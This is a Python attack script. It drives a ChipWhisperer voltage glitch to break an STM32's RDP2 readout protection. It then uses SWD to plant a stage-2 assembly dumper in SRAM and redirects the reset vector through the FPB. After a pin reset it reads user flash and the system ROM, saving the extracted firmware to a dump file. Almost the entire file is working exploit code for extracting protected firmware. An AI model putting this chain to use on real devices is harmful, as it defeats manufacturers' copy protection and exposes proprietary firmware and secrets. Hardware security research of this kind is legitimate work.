#!/usr/bin/env python
"""glitch1_fpb_chain.py - FPB flash extraction chained onto a glitch-1 RDP2->RDP1.

Flow (one glitch-1, then deterministic):
  1. power-on glitch-1 (BOOT0 low, crowbar, ext camped) until SWD enumerates = RDP1.
  2. over SWD, write stage2 (memory dumper) into SRAM + configure the FPB to remap
     the reset-vector fetch (0x00000004 -> stage2, 0x00000000 -> SP). Clear
     C_DEBUGEN, detach.
  3. NRST (power held - RDP1, SRAM, FPB all survive a pin reset; proven).
  4. flash-boot -> FPB redirects the reset vector -> stage2 runs as own-code and
     reads memory into SRAM scratch, then spins.
  5. re-attach SWD (RDP1 still up), read scratch.

Decisive target: the system bootloader ROM at 0x1FFF0000 - always non-FF AND
blocked by the debugger flash-lock. If stage2 reads it, the lock cleared on
detach+NRST (no power-cycle needed) => FPB-after-glitch-1 WORKS. Also reads user
flash 0x08000000.

Read-only + crowbar. No option/flash writes.
"""
import os, sys, time, glob, fcntl, random, struct, subprocess, tempfile, gc
import chipwhisperer as cw

CLKGEN = 100e6
REPEAT = 20
OFFSET = -45
EXT_LO, EXT_HI = 240, 480
POWER_OFF_MS = 60
MAX_G1 = int(os.environ.get('MAXG1', 400))

S2_BASE = 0x20001000
REMAP   = 0x20000100            # FPB remap table -> FP_REMAP = 0x100
SCRATCH = 0x2000F000            # [0x00:0x80] ROM 0x1FFF0000, [0x80:0x100] flash 0x08000000
ALIVE   = 0x2000EFF8; ALIVE_VAL = 0x1AA1AA1A
MARK_A  = 0x2000EFF4; MARK_A_VAL = 0xA5A5A5A5     # set AFTER user-flash read survives
DONE    = 0x2000EFFC; DONE_VAL  = 0xD09ED09E
SENT    = 0xBADDC0DE
# FPB / debug regs
FP_CTRL=0xE0002000; FP_REMAP=0xE0002004; FP_COMP0=0xE0002008; FP_COMP1=0xE000200C
DHCSR=0xE000EDF0
HERE = os.path.dirname(os.path.abspath(__file__))
scope = None

STAGE2 = r'''
    .syntax unified
    .cpu cortex-m3
    .thumb
    .global _start
_start:
    ldr r0, =0x20010000
    mov sp, r0
    ldr r0, =0x2000EFF8          @ ALIVE marker (proof stage2 ran, before any flash)
    ldr r1, =0x1AA1AA1A
    str r1, [r0]
    ldr r0, =0x08000000          @ USER FLASH FIRST (the real target; own-code read)
    ldr r1, =0x2000F000
    movs r2, #32
1:  ldr r3, [r0]
    str r3, [r1]
    adds r0, r0, #4
    adds r1, r1, #4
    subs r2, r2, #1
    bne 1b
    ldr r0, =0x2000EFF4          @ MARK_A: user-flash read survived (no fault)
    ldr r1, =0xA5A5A5A5
    str r1, [r0]
    ldr r0, =0x1FFF0000          @ then the system ROM
    ldr r1, =0x2000F080
    movs r2, #32
2:  ldr r3, [r0]
    str r3, [r1]
    adds r0, r0, #4
    adds r1, r1, #4
    subs r2, r2, #1
    bne 2b
    ldr r0, =0x2000EFFC          @ DONE marker (both reads finished, no fault)
    ldr r3, =0xD09ED09E
    str r3, [r0]
3:  b 3b
    .ltorg
'''


def build(src, link):
    d = tempfile.mkdtemp(prefix='g1fpb_')
    s,o,e,b = (os.path.join(d,f) for f in ('a.s','a.o','a.elf','a.bin'))
    open(s,'w').write(src)
    subprocess.run(['arm-none-eabi-as','-mcpu=cortex-m3','-mthumb','-o',o,s], check=True)
    subprocess.run(['arm-none-eabi-ld',f'-Ttext={hex(link)}','-e','_start','-o',e,o], check=True)
    subprocess.run(['arm-none-eabi-objcopy','-O','binary',e,b], check=True)
    return open(b,'rb').read()


def usbreset():
    RST=(ord('U')<<8)|20
    for d in glob.glob('/sys/bus/usb/devices/*'):
        try:
            if open(d+'/idVendor').read().strip()=='0483' and open(d+'/idProduct').read().strip()=='3748':
                b=int(open(d+'/busnum').read()); n=int(open(d+'/devnum').read())
                fd=os.open(f'/dev/bus/usb/{b:03d}/{n:03d}',os.O_WRONLY); fcntl.ioctl(fd,RST,0); os.close(fd); return
        except OSError: continue


def stlink():
    from swd.stlink import Stlink
    return Stlink(swd_frequency=1000000)


def setup():
    s = cw.scope()
    s.clock.clkgen_freq = CLKGEN
    s.adc.samples = 24400
    s.glitch.clk_src = 'clkgen'
    s.glitch.output = 'enable_only'
    s.glitch.trigger_src = 'ext_single'
    s.glitch.width = 40
    s.glitch.offset = OFFSET
    s.glitch.repeat = REPEAT
    s.io.glitch_lp = True
    s.io.glitch_hp = True
    s.trigger.triggers = 'tio4'
    s.io.tio4 = 'high_z'
    s.io.tio1 = False
    s.io.tio2 = 'high_z'
    s.io.tio3 = 'high_z'
    s.io.target_pwr = True
    return s


def power_on_glitch(ext):
    scope.glitch.ext_offset = ext
    scope.io.tio4 = 'high_z'
    scope.io.target_pwr = False
    time.sleep(POWER_OFF_MS/1000.0)
    scope.arm()
    scope.io.target_pwr = True


def main():
    global scope
    s2 = build(STAGE2, S2_BASE)
    print(f'[+] stage2 built: {len(s2)} bytes')
    scope = setup()

    # --- 1. glitch-1 until SWD opens (RDP1) ---
    print(f'[+] glitch-1 power-on until SWD opens (ext {EXT_LO}-{EXT_HI})...')
    st = None
    for i in range(1, MAX_G1+1):
        power_on_glitch(random.randint(EXT_LO, EXT_HI))
        time.sleep(0.12)
        try:
            st = stlink(); idc = st.get_idcode()
            print(f'[+] #{i} SWD OPEN (RDP1): IDCODE=0x{idc:08x} OPTCR=0x{st.get_mem32(0x40023C14):08x}')
            break
        except Exception:
            st = None
            if i % 40 == 0: print(f'    ...{i} shots, no SWD yet')
    if st is None:
        print('[!] glitch-1 never opened SWD - rerun.'); return finish(1)

    # baseline: SWD direct flash read should be blocked at RDP1
    try:
        st.get_mem32(0x1FFF0000); print('[!] SWD read of 0x1FFF0000 SUCCEEDED (chip not locked?!)')
    except Exception:
        print('[+] SWD direct read of 0x1FFF0000 BLOCKED (debug-locked, as expected)')

    # --- 2. stage stage2 + FPB over SWD ---
    print('[+] staging stage2 + FPB over SWD...')
    for off in range(0, len(s2), 4):
        st.set_mem32(S2_BASE+off, struct.unpack('<I', s2[off:off+4].ljust(4,b'\0'))[0])
    for w in range(64): st.set_mem32(SCRATCH+4*w, SENT)     # 256B scratch sentinel
    st.set_mem32(ALIVE, 0); st.set_mem32(DONE, 0)
    # FPB remap: 0x00000000->SP, 0x00000004->stage2
    st.set_mem32(FP_REMAP, 0x100)
    st.set_mem32(REMAP+0, 0x20010000)
    st.set_mem32(REMAP+4, S2_BASE | 1)
    st.set_mem32(FP_COMP0, 0x1)        # addr 0x0, remap, enable
    st.set_mem32(FP_COMP1, 0x5)        # addr 0x4, remap, enable
    st.set_mem32(FP_CTRL, 0x3)         # KEY|ENABLE
    print(f'    FP_CTRL=0x{st.get_mem32(FP_CTRL):08x} FP_REMAP=0x{st.get_mem32(FP_REMAP):08x}')
    # clear C_DEBUGEN, then PROPERLY EXIT DEBUG (de-assert the DP power-up). Plain
    # `del st` only closes USB and leaves the DP powered -> chip still sees a
    # debugger -> flash-lock stays. exit_debug() is the real detach.
    try: st.set_mem32(DHCSR, 0xA05F0000)
    except Exception: pass
    try:
        st._com.exit_debug()
        print('[+] exit_debug() issued - debug port de-asserted (real detach)')
    except Exception as e:
        print(f'[!] exit_debug failed: {type(e).__name__}: {e}')
    del st; gc.collect()
    time.sleep(0.2)

    # --- 3. NRST (power held) -> flash-boot -> FPB -> stage2 ---
    print('[+] NRST (power held) -> flash-boot -> FPB redirect -> stage2 runs...')
    scope.io.tio4 = 'gpio_low'; time.sleep(0.05); scope.io.tio4 = 'high_z'
    time.sleep(0.4)

    # --- 4. re-attach SWD (RDP1 holds), read scratch ---
    st2 = None
    for _ in range(4):
        try: st2 = stlink(); break
        except Exception: usbreset(); time.sleep(0.5)
    if st2 is None:
        print('[!] SWD did not come back after NRST (RDP1 dropped?!)'); return finish(1)
    alive = st2.get_mem32(ALIVE); marka = st2.get_mem32(MARK_A); done = st2.get_mem32(DONE)
    usr = b''.join(struct.pack('<I', st2.get_mem32(SCRATCH+4*w)) for w in range(32))
    rom = b''.join(struct.pack('<I', st2.get_mem32(SCRATCH+0x80+4*w)) for w in range(32))
    print(f'[+] ALIVE =0x{alive:08x} ({"stage2 RAN" if alive==ALIVE_VAL else "did NOT run"})')
    print(f'[+] MARK_A=0x{marka:08x} ({"USER-FLASH read survived" if marka==MARK_A_VAL else "faulted ON user-flash read"})')
    print(f'[+] DONE  =0x{done:08x} ({"both reads done" if done==DONE_VAL else "ROM read faulted/incomplete"})')
    print(f'    USER flash 0x08000000 head: {usr[:24].hex()}')
    print(f'    system ROM 0x1FFF0000 head: {rom[:24].hex()}')
    sentblk = struct.pack('<I', SENT) * 4
    usr_real = (usr[:16] != sentblk) and (usr[:16] != b'\xff'*16) and any(usr)
    print()
    if alive==ALIVE_VAL and marka==MARK_A_VAL and usr_real:
        o = os.path.join('dumps','fpb_glitch1_userflash.bin'); os.makedirs('dumps',exist_ok=True)
        open(o,'wb').write(usr)
        print('[VERDICT] *** FPB-AFTER-GLITCH-1 WORKS *** stage2 read USER FLASH as own-code '
              f'(debug-lock does NOT block own-code user-flash reads post-detach). -> {o}. '
              'ONE glitch-1 then deterministic dump.')
        rc=0
    elif alive==ALIVE_VAL and marka==MARK_A_VAL and (usr[:16]==b'\xff'*16):
        print('[VERDICT] stage2 read user flash but got ALL-FF -> user flash is BLANK on this '
              'chip (not blocked). The read PATH works; need a chip with content to prove the dump.')
        rc=0
    elif alive==ALIVE_VAL:
        print('[VERDICT] stage2 RAN but FAULTED on the USER-FLASH read (MARK_A unset) -> the '
              'debug-lock blocks own-code flash reads too, and does NOT clear on detach+NRST '
              '(needs a power-cycle, as on F1). FPB-after-glitch-1 is out; use the glitch-2 chain.')
        rc=1
    else:
        print('[VERDICT] stage2 did not run (alive unset) -> FPB redirect or NRST boot '
              'failed. Inspect FPB config / boot.')
        rc=2
    try: st2.set_mem32(DHCSR,0xA05F0000); del st2
    except Exception: pass
    return finish(rc)


def finish(rc):
    try:
        scope.io.glitch_hp=False; scope.io.glitch_lp=False
        scope.io.target_pwr=False; scope.dis()
    except Exception: pass
    gc.collect()
    return rc


if __name__ == '__main__':
    try: sys.exit(main())
    except KeyboardInterrupt: finish(1)
